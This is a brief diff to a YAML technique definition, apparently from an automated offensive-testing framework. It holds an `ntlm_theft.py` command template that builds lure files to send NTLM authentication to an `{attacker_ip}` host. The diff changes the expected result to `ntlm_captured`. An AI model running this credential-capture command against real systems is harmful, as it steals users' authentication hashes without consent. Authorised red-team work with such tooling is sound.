@@ -6,9 +6,9 @@ preconditions:
 parameters:
   target_ip: from_engagement.target_ip
 command_template: python3 ntlm_theft.py -g all -s {attacker_ip} -f payload
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- ntlm_captured
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
